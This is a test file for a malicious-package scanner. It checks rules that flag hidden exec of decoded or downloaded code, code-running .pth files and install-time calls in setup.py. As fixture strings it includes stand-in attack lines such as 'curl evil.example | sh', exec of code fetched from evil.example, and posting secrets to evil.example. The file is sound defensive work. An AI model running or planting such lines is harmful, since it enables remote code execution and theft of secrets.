"""Tests for static_code_analysis_helpers.py and the rules that read code."""

import textwrap

import pytest

from crotalus.models import (
    AnalysisContext,
    ArchiveContents,
    Finding,
    PackageHistory,
    Release,
    ReleaseMetadata,
)
from crotalus.rules import hidden_code_exec, pth_import_running_code, setup_py_install_time
from crotalus.rules.static_code_analysis_helpers import calls, read


def call_names(source: str) -> list[str | None]:
    """Full names of every call in `source`, in the order they appear."""
    py_file = read(textwrap.dedent(source))
    assert py_file is not None
    in_order = sorted(calls(py_file), key=lambda c: (c[1].lineno, c[1].col_offset))
    return [call_name for call_name, _ in in_order]


def context(
    sdist: dict[str, str] | None = None, wheel: dict[str, str] | None = None
) -> AnalysisContext:
    def contents(name: str, files: dict[str, str] | None) -> ArchiveContents | None:
        if files is None:
            return None
        # Dedent only Python, so tests can indent it; .pth whitespace is meaningful.
        files = {p: textwrap.dedent(t) if p.endswith(".py") else t for p, t in files.items()}
        return ArchiveContents(filename=name, files=files)

    return AnalysisContext(
        release=Release(id=1, name="pkg", version="1.0"),
        metadata=ReleaseMetadata(name="pkg", version="1.0"),
        package_history=PackageHistory(),
        sdist=contents("pkg-1.0.tar.gz", sdist),
        wheel=contents("pkg-1.0-py3-none-any.whl", wheel),
    )


def rule_ids(findings: list[Finding]) -> list[str]:
    return [f.rule_id for f in findings]


# static_code_analysis_helpers: resolving names


@pytest.mark.parametrize(
    ("source", "expected"),
    [
        ("exec(x)", "exec"),
        ("import base64 as b\nb.b64decode(x)", "base64.b64decode"),
        ("from zlib import decompress as d\nd(x)", "zlib.decompress"),
        ("from base64 import b64decode\nb64decode(x)", "base64.b64decode"),
        ("import builtins\nbuiltins.exec(x)", "exec"),
        ("__builtins__.exec(x)", "exec"),
        ("e = exec\ne(x)", "exec"),
        ("import urllib.request\nurllib.request.urlopen(u)", "urllib.request.urlopen"),
        ("__import__('subprocess').run(x)", "subprocess.run"),
    ],
)
def test_resolves_call(source: str, expected: str) -> None:
    assert expected in call_names(source)


def test_runtime_names_are_unknown() -> None:
    names = call_names("import builtins\ngetattr(builtins, 'ex' + 'ec')(x)")
    assert None in names  # the outer call: what getattr returns isn't known statically


def test_origins_follow_variables() -> None:
    source = textwrap.dedent(
        """
        import base64, zlib
        a = base64.b64decode(blob)
        b = zlib.decompress(a)
        c = b
        """
    )
    py_file = read(source)
    assert py_file is not None
    assert py_file.origins["c"] == {"base64.b64decode", "zlib.decompress"}


def test_origins_follow_unpacking() -> None:
    py_file = read("import base64\na, (b, *c) = base64.b64decode(x)")
    assert py_file is not None
    assert {"a", "b", "c"} <= py_file.origins.keys()


def test_attribute_assignment_does_not_taint_object() -> None:
    # Like fused's header.py: `self.x = downloaded` used to taint all of `self`.
    source = textwrap.dedent(
        """
        import requests
        class Header:
            def load(self, url):
                self.source_code = requests.get(url).text
                self.cache[url] = requests.get(url).text
            def run(self):
                exec(compile(self.other_code, "x", "exec"), self.namespace)
        """
    )
    py_file = read(source)
    assert py_file is not None
    assert "self" not in py_file.origins and "url" not in py_file.origins
    assert hidden_code_exec.check(context(wheel={"pkg/header.py": source})) == []


def test_invalid_python_is_skipped() -> None:
    assert read("print 'python 2'") is None
    assert read("\0") is None


# hidden_code_exec


@pytest.mark.parametrize(
    ("source", "kinds"),
    [
        ("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))", ["decoded"]),
        ("import base64 as b\nimport zlib\nexec(zlib.decompress(b.b64decode(x)))", ["decoded"]),
        ("import zlib\ncode = zlib.decompress(blob)\nexec(code)", ["decoded"]),
        ("from base64 import b64decode as d\nimport builtins\nbuiltins.eval(d(x))", ["decoded"]),
        ("e = exec\ne(bytes.fromhex(x))", ["decoded"]),
        ("import marshal\nexec(marshal.loads(blob))", ["decoded"]),
        ("import requests\nexec(requests.get('https://evil.example').text)", ["network"]),
        (
            "from urllib.request import urlopen\nr = urlopen(u)\ndata = r.read()\nexec(data)",
            ["network"],
        ),
        (
            "import requests, base64\nexec(base64.b64decode(requests.get(u).text))",
            ["decoded", "network"],
        ),
    ],
)
def test_hidden_code_exec(source: str, kinds: list[str]) -> None:
    findings = hidden_code_exec.check(context(wheel={"pkg/__init__.py": source}))
    assert rule_ids(findings) == ["hidden_code_exec"]
    assert findings[0].severity == "critical"
    assert findings[0].evidence["kinds"] == kinds
    assert findings[0].evidence["file"] == "pkg/__init__.py"


@pytest.mark.parametrize(
    "source",
    [
        "exec('print(1)')",  # visible code
        "exec(template)",  # unknown origin: dataclasses, template engines do this
        "import base64\nlogo = base64.b64decode(png)",  # decoding alone
        "import requests\nr = requests.get(u)\nprint(r.text)",  # network alone
        "import base64\nexec('x = 1', {'decode': base64.b64decode})",  # decoder isn't the code
    ],
)
def test_not_hidden_code(source: str) -> None:
    assert hidden_code_exec.check(context(wheel={"pkg/__init__.py": source})) == []


def test_hidden_code_in_sdist_setup_py() -> None:
    findings = hidden_code_exec.check(
        context(sdist={"setup.py": "import base64\nexec(base64.b64decode(x))\n"})
    )
    assert findings[0].evidence["archive"] == "sdist"
    assert findings[0].evidence["line"] == 2


def test_unparsable_file_is_skipped() -> None:
    assert hidden_code_exec.check(context(sdist={"setup.py": "print 'python 2'\n"})) == []


# pth_import_running_code


def test_pth_running_dangerous_code() -> None:
    pth = 'import os; os.system("curl evil.example | sh")\n'
    findings = pth_import_running_code.check(context(wheel={"evil.pth": pth}))
    assert rule_ids(findings) == ["pth_import_running_code"]
    assert findings[0].severity == "critical"
    assert findings[0].evidence["dangerous_calls"] == ["os.system"]


@pytest.mark.parametrize(
    "line",
    [
        "import base64; exec(base64.b64decode('aW1wb3J0IG9z'))",
        "import urllib.request; urllib.request.urlopen('https://evil.example')",
        "import subprocess; subprocess.Popen(['sh'])",
    ],
)
def test_pth_critical_calls(line: str) -> None:
    findings = pth_import_running_code.check(context(wheel={"x.pth": line + "\n"}))
    assert findings[0].severity == "critical"


def test_pth_import_only_is_medium() -> None:
    findings = pth_import_running_code.check(context(wheel={"pkg_init.pth": "import pkg\n"}))
    assert findings[0].severity == "medium"
    assert findings[0].evidence["lines"] == ["import pkg"]


def test_setuptools_shim_is_medium() -> None:
    # setuptools' real distutils-precedence.pth: calls, but nothing dangerous.
    shim = (
        "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
        "enabled = os.environ.get(var, 'local') == 'local'; "
        "enabled and __import__('_distutils_hack').add_shim();\n"
    )
    findings = pth_import_running_code.check(context(wheel={"distutils-precedence.pth": shim}))
    assert findings[0].severity == "medium"


@pytest.mark.parametrize(
    "files",
    [
        {"paths.pth": "src\n../lib\n"},  # only paths
        {"x.pth": "  import os; os.system('x')\n"},  # leading space: Python treats it as a path
        {"pkg/data/x.pth": "import os; os.system('x')\n"},  # not at site-packages' top level
    ],
)
def test_pth_that_runs_nothing(files: dict[str, str]) -> None:
    assert pth_import_running_code.check(context(wheel=files)) == []


def test_pth_in_wheel_data_folder() -> None:
    files = {"pkg-1.0.data/purelib/x.pth": "import os; os.system('x')\n"}
    assert pth_import_running_code.check(context(wheel=files))[0].severity == "critical"


def test_pth_in_sdist_is_ignored() -> None:
    files = {"x.pth": "import os; os.system('x')\n"}
    assert pth_import_running_code.check(context(sdist=files)) == []


# setup_py_install_time


@pytest.mark.parametrize(
    ("setup_py", "severity"),
    [
        ("import os\nos.system('curl evil.example | sh')", "high"),
        ("import subprocess as sp\nsp.Popen(['sh', '-c', 'x'])", "high"),
        ("import requests\nrequests.post('https://evil.example', data=secrets)", "high"),
        ("import socket\ns = socket.socket()", "high"),
        (  # download, then run: a dropper
            "import urllib.request, os\n"
            "urllib.request.urlretrieve(u, '/tmp/x')\n"
            "os.system('/tmp/x')",
            "critical",
        ),
    ],
)
def test_setup_py_install_time(setup_py: str, severity: str) -> None:
    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
    assert rule_ids(findings) == ["setup_py_install_time"]
    assert findings[0].severity == severity


def test_setup_py_evidence_lists_calls_in_order() -> None:
    setup_py = """
        import os, subprocess
        subprocess.run(['git', 'describe'])
        os.system('x')
        """
    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
    calls_found = findings[0].evidence["calls"]
    assert [c["call"] for c in calls_found] == ["subprocess.run", "os.system"]
    assert calls_found[0]["snippet"] == "subprocess.run(['git', 'describe'])"


@pytest.mark.parametrize(
    "files",
    [
        {"setup.py": "from setuptools import setup\nsetup(name='pkg')"},  # the normal case
        {"setup.py": "import requests\nsetup(install_requires=['requests'])"},  # import only
        {"setup.py": "print 'python 2'"},  # can't run on Python 3
        {"pkg/setup.py": "import os\nos.system('x')"},  # not the setup.py pip runs
    ],
)
def test_setup_py_that_is_fine(files: dict[str, str]) -> None:
    assert setup_py_install_time.check(context(sdist=files)) == []


def test_setup_py_in_wheel_is_ignored() -> None:
    files = {"setup.py": "import os\nos.system('x')"}
    assert setup_py_install_time.check(context(wheel=files)) == []
